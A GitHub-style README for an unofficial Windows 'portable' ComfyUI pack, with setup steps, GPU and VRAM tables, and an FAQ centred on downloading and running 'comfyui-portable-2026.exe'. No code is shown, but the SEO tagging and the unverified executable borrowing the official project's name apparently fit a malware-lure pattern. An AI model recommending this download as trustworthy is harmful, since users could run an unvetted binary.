<!-- seo-unique:comfyui-portable-2026:28c3dca84c -->

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:8B5CF6,50:7C3AED,100:6D28D9&height=140&section=header&text=Comfyui Portable 2026&fontSize=38&fontColor=fff&animation=twinkling" alt="Comfyui Portable 2026" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/ComfyUI-portable-8B5CF6?style=for-the-badge" alt="ComfyUI">
  <img src="https://img.shields.io/badge/Stable_Diffusion-local-EC4899?style=for-the-badge" alt="SD">
  <img src="https://img.shields.io/badge/FLUX-SDXL-A855F7?style=for-the-badge" alt="Flux">
  <img src="https://img.shields.io/badge/Windows-GPU-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
</p>

<p align="center">
  <b>Official ComfyUI portable habit — zip, extract, run. comfyui-portable-2026 follows that, with a named Windows pack.</b><br>
  <i>Text-to-image · SD 1.5 / SDXL / FLUX · portable Windows pack.</i>
</p>

<p align="center">
  <a href="./releases/latest">
    <img src="https://img.shields.io/badge/Download-comfyui-portable-2026.exe-7C3AED?style=for-the-badge&labelColor=1a1a2e" alt="Download">
  </a>
  &nbsp;
  <a href="#quick-start">
    <img src="https://img.shields.io/badge/Quick-start-374151?style=for-the-badge" alt="Quick start">
  </a>
</p>

---

## What you get

| | |
| :--- | :--- |
| **Local images** | SD 1.5 · SDXL · FLUX (add your own checkpoints) |
| **Portable** | One **`comfyui-portable-2026.exe`** — no system Python |
| **Offline** | After models are cached, no account and no queue |
| **GPU** | NVIDIA 6 GB+ recommended · AMD / Intel launchers in the pack |

---

## Quick start

1. Open **[Releases → Latest](./releases/latest)** and download **`comfyui-portable-2026.exe`** (or the zip/7z next to it).
2. Extract to a short Latin path, e.g. `C:\ComfyUI` — no spaces, no Cyrillic.
3. Run the bat for your GPU (`run_nvidia_gpu.bat` / AMD / Intel / CPU) or **`START.bat`**.
4. When the browser opens on `127.0.0.1:8188`, drop a `.safetensors` file into `models/checkpoints`.
5. Type a prompt → **Queue Prompt**.

See **[DOWNLOAD.md](./DOWNLOAD.md)** and **[QUICK_START.md](./QUICK_START.md)**.

---

## VRAM

| Level | GPU VRAM | RAM | Disk |
| :--- | :--- | :--- | :--- |
| Minimum | 6 GB | 16 GB | 15 GB |
| Comfort | 12 GB | 32 GB | 30 GB |
| FLUX / video | 16 GB+ | 32 GB+ | 50 GB+ |

Close games before a large graph. A black output usually means no checkpoint is loaded.

---

## FAQ

<details>
<summary><b>Do I need Python?</b></summary>

No. **`comfyui-portable-2026.exe`** is the Windows launcher / portable host.

</details>

<details>
<summary><b>AMD or Intel GPU?</b></summary>

Use the matching bat in the pack. CUDA errors on an AMD card mean you started the NVIDIA script.

</details>

<details>
<summary><b>Is this official ComfyUI?</b></summary>

The engine is [Comfy-Org/ComfyUI](https://github.com/Comfy-Org/ComfyUI). Portable install notes: [docs.comfy.org](https://docs.comfy.org/installation/comfyui_portable_windows). This repository is the named Windows pack **`comfyui-portable-2026`**.

</details>

---

<p align="center">
  <sub>comfyui-portable-2026 · comfyui · stable-diffusion · windows · local</sub>
</p>

<!-- id:8bb2cfb6e238 -->
